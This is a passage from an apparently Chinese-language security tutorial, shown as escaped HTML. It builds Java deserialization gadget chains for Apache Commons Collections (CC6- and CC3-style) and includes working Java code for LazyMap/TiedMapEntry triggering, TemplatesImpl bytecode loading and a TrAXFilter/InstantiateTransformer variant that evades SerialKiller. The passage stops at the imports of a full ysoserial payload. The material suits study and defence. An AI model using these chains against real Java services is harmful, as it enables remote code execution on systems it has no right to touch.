&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 得到被装饰后的恶意LazyMap对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TiedMapEntry&lt;/span> &lt;span style="color:#111">tme&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TiedMapEntry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;keykey&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">expMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 为了调用TiedMapEntry#hashCode 新建HashMap 并把tme作为key
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">expMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">tme&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;valuevalue&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">remove&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;keykey&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// put也会调用hash(key) 避免对后面get的影响
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;iTransformers&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 替换真正的transformers
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 序列化部分
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">expMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 触发
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">ois&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">ois&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>逻辑是比较清晰的，每一部分也都比较好懂&lt;/p>
&lt;h2 id="cc38u71">CC3(&amp;lt;8u71&lt;/h2>
&lt;p>由于&lt;code>TemplatesImpl&lt;/code>可以直接控制字节码（即java代码），所以尝试结合CC1 demo和执行字节码的部分就可以构造出CC3（的一部分）了，需要注意的是要将&lt;code>InvokerTransformer&lt;/code>执行的方法从显式的rce（getRuntime.exec）变为调用&lt;code>TemplatesImpl::newTransformer&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ChainedTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ConstantTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.TransformedMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Base64&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC3mini&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">code&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDecoder&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">decode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TemplatesImpl&lt;/span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TemplatesImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_bytecodes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]{&lt;/span>&lt;span style="color:#111">code&lt;/span>&lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_tfactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;newTransformer&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">null&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">TransformedMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;amiz&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>但是并不是标准的payload，ysoserial中并没有用到InvokerTransformer，原因是&lt;code>SerialKiller&lt;/code>的存在限制了它，我们换为&lt;code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&lt;/code>&lt;/p>
&lt;p>这个类的构造方法中调用了了&lt;code>(TransformerImpl) templates.newTransformer()&lt;/code>，免去了我们的手工调用&lt;/p>
&lt;p>缺少InvokerTransformer无法调用TraAXFilter的构造方法，这里用&lt;code>org.apache.commons.collections.functors.InstantiateTransformer&lt;/code>这个Transformer&lt;/p>
&lt;p>所以我们利用&lt;code>InstantiateTransformer&lt;/code>调用到&lt;code>TrAXFilter&lt;/code>的构造方法，再利用它构造方法中的&lt;code>templates.newTransformer&lt;/code>调用到&lt;code>TemplatesImpl&lt;/code>里的字节码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">TrAXFilter&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InstantiateTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Templates&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>完整CC3&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ysoserial.payloads&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javassist.ClassPool&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ChainedTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ConstantTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InstantiateTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.TransformedMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.xml.transform.Templates&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
